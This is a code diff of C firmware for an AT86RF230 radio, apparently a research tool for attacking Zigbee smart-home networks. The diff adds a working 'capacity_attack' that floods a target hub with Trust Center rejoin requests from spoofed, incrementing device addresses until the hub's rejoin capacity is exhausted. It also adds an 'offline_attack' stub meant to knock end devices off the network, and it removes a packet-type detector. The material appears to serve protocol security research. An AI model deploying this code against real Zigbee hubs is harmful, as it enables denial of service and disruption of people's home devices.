@@ -5,21 +5,9 @@
  * Copyright 2021 Jincheng Wang
  *
  */
-
-#include <stdbool.h>
-#include <string.h>
-#include <stdlib.h>
-
-#define F_CPU 8000000UL
-#include <util/delay.h>
-
-#include "at86rf230.h"
-#include "spi.h"
-#include "board.h"
 #include "attack.h"
-#include <assert.h>
 
-
+extern uint8_t rejoin_full_flag;
 
 /********  Transciver Library ********/
 
@@ -115,8 +103,7 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		default :
 			break;
 	}
-	_delay_ms(2000);
-	led(0);
+
 	spi_end();
 	
 	// 3: Send the packet
@@ -157,8 +144,7 @@ void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_a
 	unsigned char length = 10 + 2;
 	uint16_t FCF = 0x8863;
 	unsigned char seqno = 0xff;
-	const unsigned char cmd = 0x04;
-	unsigned char contents[11] = {};
+	unsigned char cmd = 0x04;
 
 	count += spi_send_blocks(&length, sizeof(length));
 	count += spi_send_blocks(&FCF, sizeof(FCF));
@@ -373,83 +359,13 @@ void send_transport_key(uint8_t security, ieee802154_addr* dst_addr, ieee802154_
 
 /********  END of Command Library *******/
 
-/********  Detect-Specific Library *******/
-
-/*
-* @return:
-*	0 if it is a beacon request
-*	1 if it is an secure rejoin request
-*	2 if it is an insecure rejoin request
-*	3 if it is a data request
-*/
-uint8_t detect_packet_type(void)
-{
-	uint8_t phy_len = 0;
-
-	uint8_t flag = 100;
-
-	uint8_t fcf[2];
-
-	uint8_t analyze_mac = 1;
-
-	spi_begin();
-	spi_io(AT86RF230_BUF_READ);
-	// Analyze phy len
-	phy_len = spi_recv();
-	if (phy_len <= 7) {
-		spi_end();
-		return 0;
-	}
-	// Analyze MAC
-	if (analyze_mac) {
-		// Check MAC FCF
-		_delay_us(32);
-		fcf[0] = spi_recv();
-		_delay_us(32);
-		fcf[1] = spi_recv();
-		if((fcf[0] == 0x03) && (fcf[1] == 0x08)) // Beacon Request
-		{
-			flag = 0;
-		}
-		else if ((fcf[0] == 0x61) && (fcf[1] == 0x88)) // NWK Rejoin Request
-		{
-			if (phy_len < 35) {
-				flag = 2;  // Insecure Rejoin
-			}
-			else {
-				flag = 1;
-			}
-		}
-		else if ((fcf[0] == 0x63) && (fcf[1] == 0x88)) // Data Request
-		{
-			flag = 3;
-		}
-	}
-	// We need to further judge whether the rejoin is a secure rejoin or not.
-	spi_end();	
-	return flag;
-}
-
 /********  END of Detect-Specific Library *******/
 
 /********  Attack-Specific Functions *******/
 
-/**
- * @brief  process_trust_center_rejoin contains process flow of trust center rejoin.
- * 1. Waiting for beacon request, and reply with beacon response.
- * 2. Waiting for Trust Center Rejoin Request and Data Request; Replying ACK with valid data pending flags.
- * 3. Replying Trust Center Rejoin Response.
- * 4. Waiting for Data Request; Replying Transport-Key Command.
- * 5. Replying all further messages with ACK
- * 
- * @param  *rejoin_response_flag: The flag used to mark current process of trust center rejoin.
- * 
- * @retval None
- */
-
 void process_trust_center_rejoin(uint8_t *rejoin_response_flag)
 {
-	uint8_t flag = detect_packet_type();
+	uint8_t flag = 0;
 	/*
 	*
 	* First, Replying ACK according to packet type.
@@ -493,7 +409,6 @@ void process_trust_center_rejoin(uint8_t *rejoin_response_flag)
 	{
 		if (*rejoin_response_flag == 0) 
 		{
-			led(1);
 			// send_rejoin_response(); // Send Response first
 			*rejoin_response_flag = 1;
 		}
@@ -510,4 +425,59 @@ void reconnaissance_attack(void)
 {
  // TODO: Implement the attack
 }
+
+/**
+ * @brief  Implement the first attack: Capacity Attack
+ * @note   
+ * @param  dst_addr:  The target hub's information.
+ * @retval 1 if succeed; 0 if the number of sent TC rejoin request exceeds the bound.
+ */
+uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr)
+{
+	uint32_t count = 0;
+	ieee802154_addr ghost_addr = *dst_addr;
+	ghost_addr.short_addr  = 0x1234;
+	ghost_addr.long_addr = random_addr;
+	rx_aack_config aack_config = {};
+	aack_config.aack_flag = 1;
+	aack_config.dis_ack = 0;
+	aack_config.pending = 0;
+	aack_config.target_short_addr.addr = ghost_addr.short_addr;
+	aack_config.target_pan_id.addr = ghost_addr.pan;
+
+	// The rejoin_full_flag is modified in processing_incoming_packets()
+	while(!rejoin_full_flag)
+	{
+		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, dst_addr, &ghost_addr, &aack_config);
+		// Delay for a preiod
+		_delay_ms(REJOIN_REQUEST_INTERVAL);
+		count += 1;
+		// Update the MAC address by adding 1.
+		ghost_addr.long_addr += 1;
+		// If too many trials have been done, then stop the capacility attack.
+		if (count >= MAX_REJOIN_REQUEST_NUM) {
+			return 0;
+		}
+	}
+	return 1;
+}
+
+uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* zed_addr, uint64_t random_addr)
+{
+	// 1. Launch capacity attack.
+	capacity_attack(hub_addr, random_addr);
+	// 2. Trigger ZED to leave and rejoin.
+	if (zed_addr->polling_type >= 1)
+	{
+		// TODO: Implement the Offline Attack logic shown in slides.
+
+		// For normal/high polling rate ZED, we simply create a fake rejoin request command, and don't reply with ACK
+	}
+	else
+	{
+		// TODO: How to let a low polling rate ZED receive the leave-and-rejoin message?
+	}
+	return 1;
+}
+
 /********  END of Attack-Specific Library *******/
